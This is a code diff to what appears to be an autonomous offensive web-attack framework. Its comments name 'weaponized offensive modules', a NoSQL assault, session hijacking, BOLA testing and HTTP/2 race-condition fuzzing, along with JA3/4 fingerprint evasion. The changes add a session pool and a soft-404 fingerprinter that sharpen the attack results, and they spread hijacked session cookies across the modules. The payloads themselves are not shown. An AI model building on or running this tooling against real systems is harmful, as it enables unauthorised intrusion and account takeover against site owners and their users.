@@ -6,6 +6,7 @@ Features:
 - Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
 - Automated BOLA and state-skipping vector evaluation across security tiers
 - Live autonomous test-account session propagation across exploit modules
+- Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
@@ -20,6 +21,8 @@ from concurrent.futures import ThreadPoolExecutor
 
 # Import weaponized offensive modules, transport middleware & live telemetry streamer
 from modules.transport import SecureTransport
+from modules.session_pool import PersistentSessionPool
+from modules.response_diff import ResponseFingerprinter
 from modules.crawler import crawl_target
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
@@ -146,12 +149,19 @@ def inspect_cookie_security(headers):
         issues.append("SameSite attribute missing")
     return issues
 
-def classify_and_adapt(response, current_payload, endpoint=""):
+def classify_and_adapt(response, current_payload, endpoint="", fingerprinter=None):
     status = response.get("status", 0)
     body = response.get("body", "")
     headers = response.get("headers", {})
     findings = []
     mutated_payloads = []
+
+    # Use ResponseFingerprinter to filter out soft 404s and false positives
+    if fingerprinter:
+        is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
+        if is_fp:
+            # Filtered out as false positive/soft error page
+            return [], []
     
     if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
         extracted_proof = {}
@@ -207,7 +217,7 @@ def verify_hijacked_session(transport, endpoint):
 # ============================================================
 # ACTIVE ADAPTIVE ENDPOINT TESTING
 # ============================================================
-def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None):
+def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None):
     endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
     info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
     results = []
@@ -242,15 +252,16 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None):
             continue
             
         res_obj = {"status": status, "headers": headers, "body": body}
-        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint)
+        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint, fingerprinter=fingerprinter)
         
-        results.append({
-            "endpoint": endpoint,
-            "test": current_test["name"],
-            "status": status,
-            "elapsed": 0.1,
-            "findings": findings,
-        })
+        if findings:
+            results.append({
+                "endpoint": endpoint,
+                "test": current_test["name"],
+                "status": status,
+                "elapsed": 0.1,
+                "findings": findings,
+            })
 
         for idx, mutant in enumerate(dynamic_mutations, 1):
             test_queue.insert(0, {
@@ -297,8 +308,18 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         
     start = time.monotonic()
     
-    # Initialize Centralized Secure Transport Wrapper (v7.0 with JA3/4 & Poisson Behavioral Jitter)
+    # Initialize Centralized Secure Transport Wrapper & Persistent Session Pool
     transport = SecureTransport(target_url)
+    session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
+    fingerprinter = ResponseFingerprinter()
+
+    # Capture a 404 baseline to feed into the response differential fingerprinter
+    try:
+        f_status, f_headers, f_body = transport.request("GET", "/brutedog-nonexistent-baseline-404")
+        fingerprinter.capture_baseline("soft_404", f_status, f_body, f_headers)
+        info("[+] Captured dynamic 404 response baseline for false-positive reduction.")
+    except Exception:
+        pass
 
     # 0. Stateful State-Machine Crawling & Reconnaissance
     section("STATEFUL STATE-MACHINE MAPPING & RECON")
@@ -321,6 +342,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     if transport.cookie_jar:
         success(f"Propagating active operator session cookie across transport layer.")
+        session_pool.cookie_jar.update(transport.cookie_jar)
         verify_hijacked_session(transport, "/dashboard")
 
     if leaked_secrets:
@@ -336,7 +358,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     async def worker(path):
         async with semaphore:
             return await asyncio.to_thread(
-                test_endpoint, transport, path, credentials_list, leaked_secrets
+                test_endpoint, transport, path, credentials_list, leaked_secrets, fingerprinter
             )
             
     tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
@@ -361,9 +383,14 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     except Exception as exc:
         error(f"Session hijack failed: {exc}")
 
-    # 3. High-Concurrency HTTP/2 Single-Packet Race Condition Fuzzing
+    # 3. High-Concurrency HTTP/2 Single-Packet Race Condition Fuzzing (using shared session pool)
     try:
-        await run_race_condition_test(target_url, port=port, use_ssl=secure)
+        await run_race_condition_test(
+            target_url, 
+            port=port, 
+            use_ssl=secure, 
+            session_pool=session_pool
+        )
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
             
